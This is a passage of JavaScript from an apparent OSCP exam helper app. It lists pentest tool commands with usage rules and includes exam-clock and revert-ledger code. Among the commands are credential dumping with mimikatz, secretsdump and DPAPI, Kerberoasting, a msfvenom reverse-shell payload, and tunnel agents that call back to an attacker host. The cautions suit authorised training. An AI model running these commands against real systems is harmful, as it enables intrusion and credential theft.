 ta('enum4linux-ng','enum4linux-ng','SMB and Auth','core','Null/guest/credentialed SMB-RPC enumeration with structured output.','enum4linux-ng -A $IP -oA scans/enum4linux-ng','smbclient, rpcclient, NetExec and ldapsearch.'),
 ta('rpcclient','rpcclient','SMB and Auth','core','Manual RPC users, groups, policy, SIDs and domain information.','rpcclient -U "$DOMAIN/$USER%$PASS" $IP','enum4linux-ng or NetExec; use one query at a time to isolate failures.'),
 ta('manspider','MANSPIDER','SMB and Auth','conditional','Several readable shares require filename/content triage for secrets.','manspider $IP -u "$USER" -p "$PASS" -d "$DOMAIN" -f passw user config xml ini txt','smbclient recursive listing/download and local rg search.','Constrain hosts, shares, patterns and output; manually review hits.'),

 ta('ldapsearch','ldapsearch','Active Directory','core','Discover naming contexts or perform exact LDAP object/attribute queries.','ldapsearch -x -H ldap://$DC_IP -s base namingContexts\nldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -W -b "$BASE_DN" "(objectClass=user)" sAMAccountName','NetExec LDAP, ldeep or PowerView.'),
 ta('ldeep','ldeep','Active Directory','conditional','Credentialed LDAP enumeration needs readable, focused output.','ldeep ldap -u "$USER" -p "$PASS" -d "$DOMAIN" -s ldap://$DC_IP users','ldapsearch or NetExec LDAP; confirm the installed ldeep help because syntax can drift.'),
 ta('username-anarchy','Username Anarchy','Active Directory','conditional','Real employee/full names are known but the domain username convention is not.','./username-anarchy --input-file names.txt > username_candidates.txt','Use the built-in AD username generator first; manually generate a few first.last / flast / firstl forms if needed, then validate the smallest list with Kerberos/LDAP/RPC.','Generation is offline and safe; validation can affect accounts. Keep the candidate list evidence-based and review lockout policy before any password testing.'),
 ta('kerbrute','Kerbrute','Active Directory','sensitive','Validate a known user list or carefully test one password after policy review.','kerbrute userenum -d $DOMAIN users.txt --dc $DC_IP -o loot/valid-users.txt','GetNPUsers/LDAP/RPC enumeration.','Failed pre-authentication can lock accounts. Review policy, use small lists, and avoid uncontrolled spraying.'),
 ta('bloodhound','BloodHound CE + collector','Active Directory','core','Map relationships after obtaining domain credentials; re-collect after new identities.','bloodhound-ce-python -d $DOMAIN -u "$USER" -p "$PASS" -ns $DC_IP -c All --zip\nsudo bloodhound-start','RustHound-CE or SharpHound as collector alternatives; ldapsearch/PowerView/manual ACL checks for manual validation.','A graph edge is a hypothesis; validate the exact ACE, object, prerequisite and action.'),
 ta('certipy','Certipy-AD','Active Directory','conditional','AD CS is present or certificate services/templates are suspected.','certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC_IP -enabled -vulnerable -stdout','certutil/PowerView/manual LDAP template and CA checks.','Prove enrollment rights and exact CA/template settings before any modifying/request action.'),
 ta('impacket-kerberos','Impacket Kerberos helpers','Active Directory','core','AS-REP, Kerberoast, tickets, S4U or ticket conversion with exact prerequisites.','impacket-GetNPUsers "$DOMAIN/" -dc-ip $DC_IP -usersfile users.txt -no-pass\nimpacket-GetUserSPNs "$DOMAIN/$USER" -dc-ip $DC_IP -request  # password prompt','Rubeus from Windows; fix DNS/time/domain format before changing tools.'),
 ta('impacket-remote','Impacket remote access','Active Directory','core','Administrative-capable credentials need a documented remote shell method.','impacket-wmiexec "$DOMAIN/$USER@$IP"  # password prompt','psexec, smbexec, atexec, evil-winrm or native PowerShell remoting.'),
 ta('impacket-secretsdump','Impacket secretsdump','Active Directory','conditional','Local admin/DC-equivalent access or offline SAM/SYSTEM hives are proven.','impacket-secretsdump -sam SAM -system SYSTEM LOCAL','reg save plus secretsdump, Mimikatz or manual DPAPI path.','Use only after proving the required privilege and document what was accessed.'),
 ta('impacket-smbclient','Impacket SMB client','Active Directory','conditional','Samba smbclient behavior differs, Kerberos/DFS matters, or recursive retrieval is justified.','impacket-smbclient "$DOMAIN/$USER@$IP"  # password prompt','smbclient, smbmap or NetExec share enumeration.','List first. Download only files necessary for the objective; current 0.13.1 adds improved listings, DFS support and recursive rget.'),
 ta('impacket-dpapidump','Impacket dpapidump','Active Directory','conditional','Remote administrative/SYSTEM-equivalent access is proven and DPAPI user material or SCCM client secrets are necessary for the path.','impacket-dpapidump -creds -dc-ip "$DC_IP" "$DOMAIN/$USER@$TARGET_HOST"  # password prompt','Manual DPAPI collection/decryption, secretsdump, Mimikatz or application-specific config.','Privileged, remote and late-stage. Scope collection to one target/purpose; -sccm is a separate explicit action, not a default.'),
 ta('bloodyad','BloodyAD','Active Directory','conditional','A validated LDAP ACL edge needs a focused read/write action.','bloodyAD -d $DOMAIN --host $DC_FQDN -u "$USER" -p "$PASS" get writable','Impacket dacledit/owneredit, PowerView or ldapmodify.','Read first, back up the original state, make the minimum change, and preserve rollback.'),
 ta('targetedkerberoast','targetedKerberoast','Active Directory','conditional','You can write a target user SPN and need a reversible Kerberoast path.','python3 targetedKerberoast.py -d $DOMAIN -u "$USER" -p "$PASS" --dc-ip $DC_IP --request-user $TARGET_USER','BloodyAD/PowerView to validate SPN write; restore the original SPN.','Requires a proven write edge. Back up and restore changed attributes.'),
 ta('pywhisker','pyWhisker','Active Directory','conditional','A validated write edge permits KeyCredentialLink / shadow credentials.','python3 pywhisker.py -d $DOMAIN -u "$USER" -p "$PASS" --target "$TARGET" --action list','Certipy shadow or manual LDAP read/backup.','List and back up before modification; exact PKINIT/Key Trust prerequisites must exist.'),
 ta('powerview','PowerView','Active Directory','core','Windows-side AD users, groups, sessions, ACLs and object validation.','Import-Module .\\PowerView.ps1; Get-DomainUser -Identity $env:USERNAME','LDAP, NetExec and BloodHound.'),
 ta('rubeus','Rubeus','Active Directory','core','Windows-side Kerberos ticket inventory, roasting, TGT requests, ticket injection and delegation validation when the useful context is on the Windows foothold.','klist\n.\\Rubeus.exe triage','Use the Rubeus material router for exact NTLM/AES/ticket/password/delegation paths; Impacket is usually cleaner from Kali. Fix DNS/time/FQDN before changing tools.','OffSec FAQ explicitly lists Rubeus as an allowed example; the exact feature/action must still comply with current exam restrictions.'),
 ta('responder','Responder analyze mode','Active Directory','sensitive','Observe name-resolution traffic without answering or poisoning.','sudo responder -I tun0 -A','tcpdump/Wireshark for passive observation.','Poisoning and spoofing are explicitly prohibited. Analyze mode only does not authorize active responses.'),
 ta('coercer','Coercer / PetitPotam family','Active Directory','sensitive','Only after an exact coercion/relay hypothesis and rule review.','coercer -h','Manual RPC exposure checks and architecture review.','Coercion/relay workflows can cross rule boundaries; do not run by default and never combine with spoofing/poisoning.'),

 ta('evil-winrm','Evil-WinRM','Remote Access','core','WinRM credentials are valid and the user is authorized for remote management.','evil-winrm -i $IP -u "$USER" -p "$PASS"','PowerShell Core/PSSession, NetExec WinRM validation or WMI/SMB execution if admin.'),
 ta('freerdp','FreeRDP','Remote Access','core','RDP is reachable and GUI logon rights need validation.','xfreerdp /v:$IP /u:"$DOMAIN\\$USER" /p:"$PASS" /cert:ignore +clipboard','xfreerdp3 or rdesktop; distinguish valid auth from logon authorization.'),
 ta('ssh','OpenSSH','Remote Access','core','SSH credentials/key or forwarding capability exists.','ssh -i id_rsa -o IdentitiesOnly=yes $USER@$IP','Password auth, ProxyJump or plink on Windows.'),

 ta('dns','dig / dnsrecon','Services','core','DNS/53 is open or domain/vhost discovery depends on records.','dig @$IP $DOMAIN ANY\ndig @$IP $DOMAIN AXFR','host/nslookup and Nmap DNS scripts.'),
 ta('snmp','snmpwalk / onesixtyone','Services','core','UDP/161 is open or SNMP is suspected.','onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $IP\nsnmpwalk -v2c -c public $IP 1','snmp-check or targeted OID queries.'),
 ta('nfs','showmount / rpcinfo','Services','core','RPC/NFS ports are open.','rpcinfo -p $IP\nshowmount -e $IP','Nmap nfs-* scripts; mount read-only first.'),
 ta('smtp','smtp-user-enum / swaks','Services','conditional','SMTP banner/capabilities suggest user enumeration or mail relay/functionality testing.','smtp-user-enum -M VRFY -U users.txt -t $IP\nswaks --to user@$DOMAIN --server $IP','telnet/nc manual SMTP dialogue and Nmap smtp-* scripts.','Keep recipient list and actions in scope; do not send external mail.'),
 ta('ftp','FTP / lftp','Services','core','FTP is open: test anonymous, permissions, passive mode and exposed files.','ftp $IP\nlftp -u anonymous,anonymous $IP','curl ftp://$IP/ or Nmap ftp-* scripts.'),
 ta('redis','redis-cli','Services','conditional','Redis is exposed locally/remotely; test authentication/config safely.','redis-cli -h $IP -p 6379 INFO','nc/manual RESP and Nmap redis-info.','Do not write persistence/config until a specific primitive and rollback are understood.'),
 ta('mysql','MySQL / MariaDB client','Services','core','3306 or recovered DB credentials.','mysql -h $IP -u "$USER" -p','Nmap mysql-* scripts or application config/source review.'),
 ta('postgres','psql','Services','core','5432 or recovered PostgreSQL credentials.','PGPASSWORD="$PASS" psql -h $IP -U "$USER" -d postgres','Nmap pgsql-brute only with policy/scope care; inspect application config.'),
 ta('mssql','Impacket mssqlclient','Services','core','1433 or recovered SQL Server credentials; Windows auth/context matters.','impacket-mssqlclient "$DOMAIN/$USER@$IP" -windows-auth  # password prompt','sqsh/sqlcmd or NetExec MSSQL.'),
 ta('mongo','mongosh','Services','conditional','MongoDB is reachable or credentials/config are recovered.','mongosh --host "$IP" -u "$USER" --authenticationDatabase admin -p  # password prompt','mongo legacy client, curl only for HTTP status endpoints, or application connection strings.'),
 ta('oracle','ODAT / sqlplus','Services','conditional','Oracle listener/database is confirmed.','odat.py sidguesser -s $IP -p 1521','tnscmd10g, sqlplus and Nmap oracle-* scripts.','Start with enumeration; avoid broad password guessing and unsafe modules.'),
 ta('grpcurl','grpcurl','Services','conditional','HTTP/2 or gRPC is confirmed; reflection/protos may expose callable methods.','grpcurl -plaintext $IP:$PORT list','Burp/curl with known proto or application source review.'),

 ta('searchsploit','SearchSploit','Exploit Research','core','A precise product/version/component is known.','searchsploit -w "$PRODUCT $VERSION"\nsearchsploit -m $EDB_ID','Exploit-DB/GitHub/vendor advisory search; preserve source URL and original hash.'),
 ta('msfvenom','msfvenom','Exploit Research','core','Generate a payload with a documented command and correct architecture/format.','msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe','Manual shellcode/compiler or Nishang/powercat for a justified context.','msfvenom is allowed across targets; Meterpreter remains restricted to the selected Metasploit target.'),
 ta('metasploit','Metasploit Framework','Exploit Research','sensitive','Only after consciously locking Metasploit to one selected target.','msfconsole -q','Manual PoC, searchsploit and a normal listener.','One target only; the lock begins even if use/check fails. Never pivot with Metasploit. Multi/handler is allowed broadly, but Meterpreter is not.'),
 ta('gdb','GDB / checksec','Exploit Research','conditional','A local binary, crash or custom program needs architecture/protection/debug analysis.','file ./binary; checksec --file=./binary; gdb -q ./binary','readelf, objdump, strings, ldd, strace and ltrace.'),

 ta('hashid','hashid / hash-identifier','Credentials','core','Identify an unknown hash before selecting a cracking mode.','hashid -m hashes.txt','hash-identifier plus contextual length/prefix analysis.'),
 ta('hashcat','Hashcat','Credentials','core','A recoverable offline hash and correct mode are known.','hashcat -m $MODE hashes.txt /usr/share/wordlists/rockyou.txt --status','John the Ripper; confirm parsing/mode with one known sample.'),
 ta('john','John + *2john','Credentials','core','Convert and crack archives, SSH keys, KeePass, Office, PDFs or Unix hashes.','zip2john archive.zip > hash.txt; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt','Hashcat after conversion; use john --show to verify.'),
 ta('hydra','Hydra / Medusa','Credentials','sensitive','A small, justified online credential test after policy/lockout review.','hydra -l "$USER" -P shortlist.txt -t 2 -f $IP ssh','Manual login, NetExec protocol auth or Kerbrute for a precise AD case.','Online failures may lock accounts or destabilize services. Prefer credential reuse and tiny lists.'),

 ta('linpeas','LinPEAS','Linux PrivEsc','core','After a Linux shell: broad enumeration saved for review.','./linpeas.sh -a | tee linpeas.txt','lse.sh, LinEnum and manual checks. Read the saved output; colors are not proof.'),
 ta('pspy','pspy','Linux PrivEsc','core','Observe processes/cron/jobs without root, especially writable dependencies.','./pspy64 -pf -i 1000 | tee pspy.txt','ps --forest loops, systemctl list-timers, cron files and inotify tools.'),
 ta('lse','Linux Smart Enumeration / lse.sh','Linux PrivEsc','core','A quieter second opinion or LinPEAS is unavailable.','./lse.sh -l 2 | tee lse.txt','Manual sudo/SUID/capabilities/services/cron/container checks.'),
 ta('les','Linux Exploit Suggester','Linux PrivEsc','last','Manual configuration paths are exhausted and exact kernel/package data is known.','./linux-exploit-suggester.sh | tee les.txt','Vendor security tracker, package revision and manual prerequisite checks.','Suggestions are hypotheses. Kernel exploits are crash-prone and last resort.'),
 ta('gtfobins','GTFOBins + manual inspection','Linux PrivEsc','core','sudo -l, SUID/SGID, capabilities or writable privileged execution is found.','sudo -l; find / -perm -4000 -type f 2>/dev/null; getcap -r / 2>/dev/null','man pages, strings/strace/ltrace and local documentation.','Match the exact permission/context; GTFOBins entries are not automatic vulnerabilities.'),

 ta('privesccheck','PrivescCheck','Windows PrivEsc','core','First Windows post-shell automated pass; save and read output.','Import-Module .\\PrivescCheck.ps1; Invoke-PrivescCheck | Tee-Object privesccheck.txt','winPEAS plus manual privileges/services/tasks/registry checks.'),
 ta('winpeas','winPEAS','Windows PrivEsc','core','Broad Windows enumeration after baseline; preserve output.','.\\winPEASx64.exe | Tee-Object winpeas.txt','PrivescCheck, Seatbelt and manual validation.'),
 ta('seatbelt','Seatbelt','Windows PrivEsc','core','Complementary host/user/config/credential collection.','.\\Seatbelt.exe -group=all > seatbelt.txt','SharpUp/PowerUp and native PowerShell/WMI queries.'),
 ta('sharpup','SharpUp / PowerUp','Windows PrivEsc','core','Focused service, path, installer, autorun and configuration checks.','.\\SharpUp.exe audit\nImport-Module .\\PowerUp.ps1; Invoke-AllChecks','sc.exe, Get-CimInstance, icacls and registry queries.'),
 ta('accesschk','AccessChk / Sysinternals','Windows PrivEsc','core','Confirm exact permissions on a service, binary, directory, registry key or process.','.\\accesschk64.exe -accepteula -uwcqv "$USER" *','icacls, sc.exe sdshow, Get-Acl and whoami /priv.'),
 ta('sysinternals','Procmon / Process Explorer / TCPView','Windows PrivEsc','conditional','GUI access exists and runtime file/registry/process/listener behavior must be mapped.','procmon.exe /AcceptEula','Process Monitor filters, tasklist /svc, netstat -ano and Get-Process/Get-NetTCPConnection.'),
 ta('watson','Watson','Windows PrivEsc','last','Build/patch triage after configuration paths are exhausted.','.\\Watson.exe | Tee-Object watson.txt','systeminfo/hotfix queries plus manual advisory prerequisite validation.','Patch suggestions are not proof; kernel/driver paths remain last resort.'),
 ta('mimikatz','Mimikatz','Windows PrivEsc','conditional','Privilege and credential context is proven; specific local credential material is needed.','.\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit','SharpDPAPI, cmdkey, vaultcmd, DPAPI files or secretsdump.','OffSec lists Mimikatz as allowed, but access only necessary scoped material and document privilege.'),
 ta('sharpdpapi','SharpDPAPI','Windows PrivEsc','conditional','DPAPI blobs/credentials are found and the required user/domain key context exists.','.\\SharpDPAPI.exe credentials','Mimikatz dpapi, browser/file inspection and masterkey validation.'),

 ta('ligolo','Ligolo-ng','Pivoting','core','A foothold reaches an internal subnet that Kali cannot route to.','sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n.\\agent.exe -connect $LHOST:11601 -accept-fingerprint $FINGERPRINT','Chisel or SSH forwarding. Prove pivot-host reachability before adding routes.'),
 ta('chisel','Chisel','Pivoting','core','Need a SOCKS or single reverse tunnel and Ligolo is unsuitable.','chisel server --reverse --port 8000\nchisel client $LHOST:8000 R:socks','SSH -D/-L/-R or Socat.'),
 ta('ssh-forward','SSH forwarding / ProxyJump','Pivoting','core','SSH access exists and stable native forwarding is sufficient.','ssh -N -D 1080 $USER@$PIVOT\nssh -J $USER@$PIVOT $USER@$INTERNAL','Chisel/Ligolo; use -L for one service and -R for reverse reachability.'),
 ta('proxychains','proxychains4','Pivoting','core','A SOCKS proxy exists and a TCP client needs to traverse it.','proxychains4 -q nmap -sT -Pn -n -p $PORTS $INTERNAL_IP','Use tool-native proxy support or Ligolo TUN routing. No SYN/UDP through ordinary SOCKS.'),
 ta('socat','Socat','Pivoting','core','One TCP/UDP relay, listener or PTY is needed.','socat TCP-LISTEN:$LPORT,fork,reuseaddr TCP:$INTERNAL_IP:$RPORT','ncat, SSH forwarding or Chisel.'),

 ta('http-transfer','Python HTTP / uploadserver','File Transfer','core','Serve tools or receive a necessary file over HTTP.','python3 -m http.server 8000 --directory tools\npython3 -m uploadserver 8000','curl/wget/IWR, SMB or SCP. Bind only the intended interface when possible.'),
 ta('smbserver','Impacket smbserver','File Transfer','core','Windows can reach attacker SMB and HTTP is blocked/awkward.','sudo impacket-smbserver share $(pwd) -smb2support','WebDAV, HTTP or Evil-WinRM upload/download.'),
 ta('native-transfer','Native curl/wget/IWR/certutil','File Transfer','core','Use target-native download methods before adding another tool.','curl http://$LHOST:8000/file -o file\nwget http://$LHOST:8000/file\nInvoke-WebRequest http://$LHOST:8000/file -OutFile file','certutil -urlcache, bitsadmin, PowerShell byte arrays or SMB.'),
 ta('scp','scp / sftp','File Transfer','core','SSH is available and encrypted transfer is simplest.','scp ./file $USER@$IP:/tmp/file','sftp, rsync-over-SSH or HTTP.'),

 ta('shell-upgrade','script / Python PTY','Shell Handling','core','A Unix reverse shell lacks job control, TTY or sane terminal behavior.','python3 -c "import pty; pty.spawn(\'/bin/bash\')"\nscript -qc /bin/bash /dev/null','socat PTY, rlwrap on the listener, then stty rows/cols.'),
 ta('listeners','rlwrap / nc / ncat','Shell Handling','core','Receive a basic callback with predictable logging/line editing.','rlwrap -cAr nc -lvnp $LPORT\nrlwrap -cAr ncat -lvnp $LPORT --keep-open','socat or an allowed multi/handler without Meterpreter on non-selected targets.')
];

const BEST_TOOL_IDS=new Set([
 'nmap','curl','feroxbuster','ffuf','burp','nxc','smbclient','rpcclient',
 'ldapsearch','bloodhound','certipy','impacket-kerberos','impacket-remote','evil-winrm',
 'searchsploit','msfvenom','hashcat','john','linpeas','pspy','privesccheck','winpeas',
 'seatbelt','ligolo','http-transfer','smbserver','shell-upgrade','listeners'
]);
function toolTierLabel(t){return({core:'CORE',conditional:'CONDITIONAL',sensitive:'RULE-SENSITIVE',last:'LAST RESORT'})[t]||t.toUpperCase()}
function toolTierClass(t){return t==='core'?'v16Core':t==='conditional'?'v16Conditional':t==='sensitive'?'v16Sensitive':'v16Last'}
function renderToolArsenal(){
 const grid=$('#toolGrid'),count=$('#toolCount');if(!grid||!count)return;
 const q=String($('#toolSearch')?.value||'').trim().toLowerCase(),scope=$('#toolScope')?.value||'best',cat=$('#toolCategory')?.value||'all',tier=$('#toolTier')?.value||'all';
 const rows=TOOL_ARSENAL.filter(x=>(scope==='all'||BEST_TOOL_IDS.has(x.id))&&(cat==='all'||x.category===cat)&&(tier==='all'||x.tier===tier)&&(!q||[x.name,x.category,x.tier,x.trigger,x.command,x.fallback,x.rule].join(' ').toLowerCase().includes(q)));
 count.textContent=`${rows.length} shown · ${scope==='best'?BEST_TOOL_IDS.size+' recommended':TOOL_ARSENAL.length+' total'}`;
 grid.innerHTML=rows.map(x=>`<article class="toolCard"><div class="row" style="justify-content:space-between"><h3>${esc(x.name)}</h3><button class="btn toolCopy" data-tool="${esc(x.id)}">Copy</button></div><div class="toolMeta"><span class="chip">${esc(x.category)}</span><span class="v16Tier ${toolTierClass(x.tier)}">${toolTierLabel(x.tier)}</span></div><div class="toolWhen"><b>Use when:</b> ${esc(x.trigger)}</div><pre class="toolCmd">${esc(x.command)}</pre><div class="toolWhen"><b>Fallback / validation:</b> ${esc(x.fallback)}</div>${x.rule?`<div class="toolRule ${x.tier==='sensitive'?'sensitive':''}"><b>Rule:</b> ${esc(x.rule)}</div>`:''}</article>`).join('')||'<div class="toolEmpty">No tools match these filters.</div>';
 $$('.toolCopy').forEach(b=>b.onclick=async()=>{const x=TOOL_ARSENAL.find(y=>y.id===b.dataset.tool);if(!x)return;await guardedCopyText(sanitizeUnicode(x.command),x.name+' command',null,{allowPlaceholders:true})});
}
function initToolArsenal(){
 const c=$('#toolCategory');if(!c)return;
 const old=c.value||'all';c.innerHTML='<option value="all">All categories</option>'+[...new Set(TOOL_ARSENAL.map(x=>x.category))].sort().map(x=>`<option value="${esc(x)}">${esc(x)}</option>`).join('');c.value=old;
 ['toolSearch','toolScope','toolCategory','toolTier'].forEach(id=>{const e=$('#'+id);if(e)e.addEventListener(id==='toolSearch'?'input':'change',renderToolArsenal)});
 $('#toolReset').onclick=()=>{$('#toolSearch').value='';$('#toolScope').value='best';$('#toolCategory').value='all';$('#toolTier').value='all';renderToolArsenal()};
 renderToolArsenal();
}

/* Unicode / smart-quote hygiene */
function unicodeProblems(s){
 const hits=[],rules=[[/[\u2018\u2019\u201A\u201B]/g,'smart single quote'],[/[\u201C\u201D\u201E\u201F]/g,'smart double quote'],[/[\u2013\u2014\u2212]/g,'Unicode dash/minus'],[/\u00A0/g,'non-breaking space'],[/[\u200B-\u200D\uFEFF]/g,'zero-width character']];
 for(const [re,name] of rules){re.lastIndex=0;if(re.test(s))hits.push(name)}return hits;
}
function sanitizeUnicode(s){return String(s||'').replace(/[\u2018\u2019\u201A\u201B]/g,"'").replace(/[\u201C\u201D\u201E\u201F]/g,'"').replace(/[\u2013\u2014\u2212]/g,'-').replace(/\u00A0/g,' ').replace(/[\u200B-\u200D\uFEFF]/g,'')}
const v14LintBase=lintCommand;
lintCommand=function(cmd){const r=v14LintBase(cmd),p=unicodeProblems(cmd);if(p.length)r.issues.unshift({sev:'block',title:'Unicode / smart-quote formatting detected',why:`Found: ${p.join(', ')}. Sanitize/re-type before blaming the target or tool.`,code:'unicode-format'});return r};
function showUnicode(){const before=$('#guardCommand').value,after=sanitizeUnicode(before),p=unicodeProblems(before);$('#unicodeSanitizeResult').innerHTML=p.length?`Detected <b>${esc(p.join(', '))}</b>.${before!==after?'<div class="unicodeDiff" style="margin-top:7px">'+esc(after)+'</div>':''}`:'No risky Unicode formatting detected.';return after}
$('#sanitizeGuardCommand').onclick=()=>{const s=showUnicode();$('#guardCommand').value=s;$('#guardResults').innerHTML=guardIssuesHTML(lintCommand(s));toast('Formatting sanitized')};
$('#copySanitizedCommand').onclick=async()=>await guardedCopyText(sanitizeUnicode($('#guardCommand').value),'Sanitized command',$('#guardResults'));

/* Exam clock */
function fmtRemain(ms){if(ms<=0)return'00:00:00';let s=Math.floor(ms/1000),h=Math.floor(s/3600);s%=3600;const m=Math.floor(s/60);s%=60;return`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`}
function clockDates(){if(!examClock.start)return null;const start=new Date(examClock.start);if(Number.isNaN(+start))return null;const attackEnd=new Date(+start+(23*60+45)*60000),reportEnd=new Date(+attackEnd+24*60*60000);return{start,attackEnd,reportEnd}}
function renderClock(){
 if(!$('#examStart'))return;const d=clockDates(),now=new Date();$('#examStart').value=examClock.start||'';
 if(!d){$('#attackCountdown').textContent='--:--:--';$('#reportCountdown').textContent='--:--:--';$('#clockPhase').textContent='Set the exam start time.';$('#clockDeadlines').innerHTML='';renderOperatorClock();return}
 $('#attackCountdown').textContent=fmtRemain(+d.attackEnd-now);$('#reportCountdown').textContent=fmtRemain(+d.reportEnd-now);
 let phase='BEFORE EXAM';if(now>=d.start&&now<d.attackEnd)phase='ATTACK WINDOW';else if(now>=d.attackEnd&&now<d.reportEnd)phase='REPORTING WINDOW';else if(now>=d.reportEnd)phase='REPORT DEADLINE PASSED';
 $('#clockPhase').innerHTML=`<b>${phase}</b> · attack ends ${d.attackEnd.toLocaleString()} · report deadline ${d.reportEnd.toLocaleString()}`;
 $('#clockDeadlines').innerHTML=`<label><input type="checkbox" disabled ${now>=d.attackEnd?'checked':''}> Attack window ended — proof values should already be in control panel</label><label><input type="checkbox" disabled ${now>=d.reportEnd?'checked':''}> Report deadline reached</label><label><input id="clockConfirmEmail" type="checkbox" ${submissionState.confirmEmail?'checked':''}> Submission acknowledgement received</label><label>Official proctor/control-panel timing overrides this local clock</label>`;
 $('#clockConfirmEmail').onchange=e=>{submissionState.confirmEmail=e.target.checked;saveSubmission()};
 renderOperatorClock();
}
function renderOperatorClock(){const r=$('#operatorClock'),d=clockDates();if(!r)return;if(!d){r.innerHTML='Not configured. <button class="btn opClockOpen">Set clock →</button>';r.querySelector('.opClockOpen').onclick=()=>switchView('clockView');return}const now=new Date(),attack=now<d.attackEnd,deadline=attack?d.attackEnd:d.reportEnd;r.innerHTML=`<b>${attack?'Attack':'Report'}:</b> ${fmtRemain(+deadline-now)}<br><span class="tiny">${attack?'Submit proof values before attack end.':'Upload final archive before deadline.'}</span><br><button class="btn opClockOpen">Clock →</button>`;r.querySelector('.opClockOpen').onclick=()=>switchView('clockView')}
$('#clockNowStart').onclick=()=>{const d=new Date(),z=n=>String(n).padStart(2,'0');$('#examStart').value=`${d.getFullYear()}-${z(d.getMonth()+1)}-${z(d.getDate())}T${z(d.getHours())}:${z(d.getMinutes())}`};
$('#saveExamClock').onclick=()=>{examClock.start=$('#examStart').value;safeStoreSet(STORE+'examClock',JSON.stringify(examClock));renderClock();toast('Exam clock saved')};
$('#clearExamClock').onclick=()=>{examClock={start:''};safeStoreRemove(STORE+'examClock');renderClock()};
setInterval(renderClock,1000);

/* Revert ledger */
function upgradeV14Target(t){t=upgradeV13Target(t);t.revertEpoch=+t.revertEpoch||0;t.needsReestablish=!!t.needsReestablish;t.reestablishNote=t.reestablishNote||'';return t}
targets=targets.map(upgradeV14Target);
const v14NewTargetBase=newTarget;newTarget=function(){return upgradeV14Target(v14NewTargetBase())};
function saveReverts(){safeStoreSet(STORE+'revertState',JSON.stringify(revertState));v9Dirty=true;renderReverts();renderOperatorReverts()}
function renderRevertSelectors(){const o=targets.map(t=>`<option value="${esc(t.id)}">${esc(targetLabel(t))}</option>`).join('');['revertTarget','incidentTarget'].forEach(id=>{const s=$('#'+id);if(s){s.innerHTML=o||'<option value="">No targets</option>';s.value=activeTargetId||targets[0]?.id||''}})}
function renderReverts(){
 if(!$('#revertUsed'))return;renderRevertSelectors();const used=+revertState.bankUsed||0;$('#revertUsed').textContent=used;$('#revertRemaining').textContent=Math.max(0,24-used);$('#revertResetState').textContent=revertState.resetUsed?'used':'available';$('#incidentCount').textContent=(revertState.ledger||[]).filter(x=>x.kind==='incident').length;
 const pending=targets.filter(t=>t.needsReestablish);$('#reestablishQueue').innerHTML=pending.length?pending.map(t=>`<div class="ledgerItem revert"><div class="row" style="justify-content:space-between"><div><b>${esc(targetLabel(t))}</b> · epoch ${t.revertEpoch}<div class="tiny">${esc(t.reestablishNote||'Re-establish prior access/path.')}</div></div><button class="btn reestDone" data-tid="${esc(t.id)}">Re-established</button></div></div>`).join(''):'None.';
 $$('.reestDone').forEach(b=>b.onclick=()=>{const t=targets.find(x=>x.id===b.dataset.tid);t.needsReestablish=false;logEvent(t,'revert','Prior access/path re-established after revert');saveTargets();renderReverts()});
 $('#incidentLedger').innerHTML=(revertState.ledger||[]).length?(revertState.ledger||[]).slice().reverse().map(x=>`<div class="ledgerItem ${x.kind}"><div class="row" style="justify-content:space-between"><b>${esc(x.kind.toUpperCase())} · ${esc(x.target||'global')}</b><span class="tiny">${new Date(x.at).toLocaleString()}</span></div><div>${esc(x.text)}</div>${x.detail?`<div class="tiny">${esc(x.detail)}</div>`:''}</div>`).join(''):'<div class="muted">No reverts/incidents logged.</div>';renderOperatorReverts();
}
$('#logRevert').onclick=()=>{const t=targets.find(x=>x.id===$('#revertTarget').value);if(!t)return;if((+revertState.bankUsed||0)>=24){alert('Current local 24-revert bank is exhausted. Log the one-time reset only if you actually reset it in the OffSec control panel.');return}if(!confirm(`Log a revert for ${targetLabel(t)}?\n\nA revert returns the target to original state and target-side changes are lost.`))return;if($('#revertCheckpoint').checked)snapshotNow(`pre-revert ${targetLabel(t)}`);const reason=$('#revertReason').value,note=$('#revertRestoreNote').value.trim();revertState.bankUsed=(+revertState.bankUsed||0)+1;t.revertEpoch++;t.needsReestablish=true;t.reestablishNote=note||'Re-establish prior foothold/tunnel/target-side changes.';revertState.ledger.push({kind:'revert',at:Date.now(),target:targetLabel(t),targetId:t.id,text:`Revert logged: ${reason}`,detail:t.reestablishNote});logEvent(t,'revert',`Revert epoch ${t.revertEpoch}: ${reason}`);saveTargets();saveReverts();$('#revertRestoreNote').value='';toast('Revert logged')};
$('#logRevertReset').onclick=()=>{if(revertState.resetUsed){alert('One-time reset is already marked used.');return}if(!confirm('Only continue if you actually reset the OffSec revert limit.'))return;revertState.ledger.push({kind:'support',at:Date.now(),target:'global',text:`Revert-limit reset logged after ${revertState.bankUsed||0} use(s).`,detail:'Fresh local 24-revert bank started.'});revertState.resetUsed=true;revertState.bankUsed=0;saveReverts()};
$('#logIncident').onclick=()=>{const t=targets.find(x=>x.id===$('#incidentTarget').value),s=$('#incidentSymptom').value.trim(),a=$('#incidentActions').value.trim();if(!s)return;revertState.ledger.push({kind:'incident',at:Date.now(),target:targetLabel(t),targetId:t?.id||'',text:s,detail:`${a}${$('#incidentProctor').checked?' · proctor/support contacted':''}`});if(t)logEvent(t,'incident',s);saveTargets();saveReverts();$('#incidentSymptom').value='';$('#incidentActions').value='';$('#incidentProctor').checked=false};
function incidentMarkdown(){return`# OSCP Revert / Technical Incident Ledger\n\nGenerated: ${new Date().toISOString()}\n\nCurrent bank: ${revertState.bankUsed||0}/24 used\nOne-time reset used: ${revertState.resetUsed?'yes':'no'}\n\n`+(revertState.ledger||[]).map(x=>`## ${new Date(x.at).toISOString()} — ${x.kind.toUpperCase()} — ${x.target||'global'}\n\n${x.text}\n\n${x.detail||''}\n`).join('\n')}
$('#exportIncidentLedger').onclick=()=>downloadText('OSCP-revert-incident-ledger.md',incidentMarkdown(),'text/markdown');
